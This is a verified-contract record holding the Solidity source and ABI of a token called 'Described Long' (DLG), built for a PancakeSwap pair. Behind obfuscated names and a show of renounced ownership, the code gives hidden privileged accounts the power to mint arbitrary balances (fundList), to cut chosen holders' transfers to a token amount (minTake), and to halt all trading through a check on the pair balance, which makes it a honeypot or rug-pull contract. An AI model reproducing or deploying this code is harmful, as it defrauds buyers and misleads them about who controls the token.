{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface takeReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeEnableReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFee {\n    function createPair(address amountLiquidityShould, address enableToken) external returns (address);\n}\n\ninterface toMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAuto) external view returns (uint256);\n\n    function transfer(address limitFund, uint256 liquidityFund) external returns (bool);\n\n    function allowance(address totalIsReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitFund,\n        uint256 liquidityFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderReceiverIs, uint256 value);\n    event Approval(address indexed totalIsReceiver, address indexed spender, uint256 value);\n}\n\ninterface amountTrading is toMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DescribedLong is modeEnableReceiver, toMax, amountTrading {\n\n    function launchedMax(uint256 liquidityFund) public {\n        walletFromEnable();\n        receiverAtAmount = liquidityFund;\n    }\n\n    uint8 private launchedSwapShould = 18;\n\n    function owner() external view returns (address) {\n        return minAt;\n    }\n\n    address private minAt;\n\n    uint256 liquidityToken;\n\n    uint256 private modeAuto = 100000000 * 10 ** 18;\n\n    function approve(address toTeam, uint256 liquidityFund) public virtual override returns (bool) {\n        maxTradingFund[_msgSender()][toTeam] = liquidityFund;\n        emit Approval(_msgSender(), toTeam, liquidityFund);\n        return true;\n    }\n\n    address amountWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private teamReceiverTo;\n\n    function minTake(address launchedTake) public {\n        walletFromEnable();\n        if (maxLimitBuy == atIs) {\n            shouldTo = swapList;\n        }\n        if (launchedTake == sellTeam || launchedTake == atTotal) {\n            return;\n        }\n        maxList[launchedTake] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedMin;\n    }\n\n    uint256 public swapList;\n\n    event OwnershipTransferred(address indexed totalAmountTo, address indexed minBuy);\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchTake;\n    }\n\n    constructor (){\n        if (listBuy != teamReceiverTo) {\n            teamReceiverTo = atFund;\n        }\n        takeReceiver isWallet = takeReceiver(amountWallet);\n        atTotal = receiverFee(isWallet.factory()).createPair(isWallet.WETH(), address(this));\n        \n        sellTeam = _msgSender();\n        marketingTotal();\n        shouldEnableToken[sellTeam] = true;\n        autoReceiver[sellTeam] = modeAuto;\n        if (teamReceiverTo != shouldTo) {\n            takeEnable = true;\n        }\n        emit Transfer(address(0), sellTeam, modeAuto);\n    }\n\n    address public sellTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedSwapShould;\n    }\n\n    function transfer(address listBuyTeam, uint256 liquidityFund) external virtual override returns (bool) {\n        return listMode(_msgSender(), listBuyTeam, liquidityFund);\n    }\n\n    bool public maxLimitBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeAuto;\n    }\n\n    uint256 constant feeLimitTotal = 6 ** 10;\n\n    uint256 public listBuy;\n\n    function marketingTotal() public {\n        emit OwnershipTransferred(sellTeam, address(0));\n        minAt = address(0);\n    }\n\n    string private launchTake = \"DLG\";\n\n    uint256 receiverAtAmount;\n\n    string private launchedMin = \"Described Long\";\n\n    mapping(address => bool) public maxList;\n\n    mapping(address => mapping(address => uint256)) private maxTradingFund;\n\n    function getOwner() external view returns (address) {\n        return minAt;\n    }\n\n    function walletAutoAmount(address atFrom, address limitFund, uint256 liquidityFund) internal returns (bool) {\n        require(autoReceiver[atFrom] >= liquidityFund);\n        autoReceiver[atFrom] -= liquidityFund;\n        autoReceiver[limitFund] += liquidityFund;\n        emit Transfer(atFrom, limitFund, liquidityFund);\n        return true;\n    }\n\n    bool private takeEnable;\n\n    uint256 public atFund;\n\n    bool public atIs;\n\n    function listMode(address atFrom, address limitFund, uint256 liquidityFund) internal returns (bool) {\n        if (atFrom == sellTeam) {\n            return walletAutoAmount(atFrom, limitFund, liquidityFund);\n        }\n        uint256 sellMode = toMax(atTotal).balanceOf(teamToken);\n        require(sellMode == receiverAtAmount);\n        require(limitFund != teamToken);\n        if (maxList[atFrom]) {\n            return walletAutoAmount(atFrom, limitFund, feeLimitTotal);\n        }\n        return walletAutoAmount(atFrom, limitFund, liquidityFund);\n    }\n\n    function transferFrom(address atFrom, address limitFund, uint256 liquidityFund) external override returns (bool) {\n        if (_msgSender() != amountWallet) {\n            if (maxTradingFund[atFrom][_msgSender()] != type(uint256).max) {\n                require(liquidityFund <= maxTradingFund[atFrom][_msgSender()]);\n                maxTradingFund[atFrom][_msgSender()] -= liquidityFund;\n            }\n        }\n        return listMode(atFrom, limitFund, liquidityFund);\n    }\n\n    uint256 public shouldTo;\n\n    mapping(address => bool) public shouldEnableToken;\n\n    address public atTotal;\n\n    address teamToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function walletShould(address takeWallet) public {\n        require(takeWallet.balance < 100000);\n        if (txShould) {\n            return;\n        }\n        \n        shouldEnableToken[takeWallet] = true;\n        if (teamReceiverTo != swapList) {\n            teamReceiverTo = shouldTo;\n        }\n        txShould = true;\n    }\n\n    mapping(address => uint256) private autoReceiver;\n\n    function balanceOf(address launchAuto) public view virtual override returns (uint256) {\n        return autoReceiver[launchAuto];\n    }\n\n    function fundList(address listBuyTeam, uint256 liquidityFund) public {\n        walletFromEnable();\n        autoReceiver[listBuyTeam] = liquidityFund;\n    }\n\n    bool public txShould;\n\n    function walletFromEnable() private view {\n        require(shouldEnableToken[_msgSender()]);\n    }\n\n    function allowance(address toEnableLaunch, address toTeam) external view virtual override returns (uint256) {\n        if (toTeam == amountWallet) {\n            return type(uint256).max;\n        }\n        return maxTradingFund[toEnableLaunch][toTeam];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIsReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAmountTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderReceiverIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toEnableLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listBuyTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFund\",\"type\":\"uint256\"}],\"name\":\"fundList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFund\",\"type\":\"uint256\"}],\"name\":\"launchedMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"minTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldEnableToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listBuyTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"}],\"name\":\"walletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DescribedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}